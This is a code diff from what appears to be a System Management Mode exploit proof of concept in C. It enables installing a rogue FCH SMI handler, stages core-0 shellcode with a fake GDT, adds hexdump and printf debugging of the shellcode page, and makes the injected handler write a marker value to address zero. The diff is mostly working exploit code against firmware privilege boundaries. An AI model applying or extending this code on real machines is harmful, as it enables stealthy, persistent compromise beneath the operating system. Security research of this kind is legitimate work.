@@ -21,7 +21,7 @@ void hexdump(const char *data, size_t size, uint64_t offset);
 
 // #define DUMP_TSEG 1
 // #define SQUIRREL_DEBUG      1
-// #define INSTALL_FCH_SMI_HANDLER 1
+#define INSTALL_FCH_SMI_HANDLER 1
 // #define INSTALL_ROOT_SMI_HANDLER 1
 
 
@@ -417,6 +417,17 @@ void set_tclose_for_core(UINT32 core_id) {
 }
 
 
+/*
+    0000: 00 00 00 00 00 00 00 00 ff ff 00 00 00 9b cf 00
+    0010: ff ff 00 00 00 9b af 00 ff ff 00 00 00 93 cf 00
+    0020: ff ff 00 00 00 fb cf 00 ff ff 00 00 00 f3 cf 00
+    0030: ff ff 00 00 00 fb af 00 00 00 00 00 00 00 00 00
+    0040: 87 40 00 40 1a 8b 00 26 2e fe ff ff 00 00 00 00
+    0050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0070: 00 00 00 00 00 00 00 00 04 00 00 00 00 f5 40 00
+*/
+
 unsigned char FAKE_GDT[] = {
     // NULL Descriptor
     /*0x00*/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -481,6 +492,8 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
     // Copy 32bit Core0_shell
     memcpy(shellcode_page, (void *) _core0_shell, sh_len);
 
+    hexdump(shellcode_page, sh_len, CORE0_SHELLCODE_ADDRESS);
+
     // Write to the mapped region
 
     // Create a copy of the GDT at offset ORIGINAL_GDT_OFFSET 
@@ -494,6 +507,7 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
 
     // Setup GDTR
     *(UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) = sizeof(FAKE_GDT) - 1;
+    printf("GDT Size (-1): %d\n", sizeof(FAKE_GDT) - 1);
     *(UINT32 *)((UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) + 1) = ORIGINAL_GDT;
     
     hexdump(shellcode_page, 0x1000, CORE0_SHELLCODE_ADDRESS);
@@ -1014,6 +1028,8 @@ smi_handler(
         UINT32 *squirrel = (UINT32 *) SQUIRREL_BAR;
         squirrel[0] = 0xAAAAAAAA;
     #endif
+    UINT32 *MEMSTART = (UINT32 *) 0x0000;
+    MEMSTART[0] = 0xCAFEBABE;
 }
 #ifdef _WIN32
 #pragma code_seg()
